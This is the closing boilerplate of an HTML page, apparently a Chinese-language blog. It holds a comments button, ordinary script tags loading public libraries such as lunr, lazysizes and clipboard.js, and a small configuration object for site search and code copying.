</a><a href=# id=view-comments class=fixed-button title=查看评论><i class="fas fa-comment fa-fw" aria-hidden=true></i></a></div><script type=text/javascript src=https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js></script><script type=text/javascript src=/lib/lunr/lunr.stemmer.support.min.js></script><script type=text/javascript src=/lib/lunr/lunr.zh.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js></script><script type=text/javascript src=https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js></script><script type=text/javascript>window.config={code:{copyTitle:"复制到剪贴板",maxShownLines:50},comment:{},search:{highlightTag:"em",lunrIndexURL:"/index.json",lunrLanguageCode:"zh",lunrSegmentitURL:"/lib/lunr/lunr.segmentit.js",maxResultLength:10,noResultsFound:"没有找到结果",snippetLength:30,type:"lunr"}}</script><script type=text/javascript src=/js/theme.min.js></script></body></html>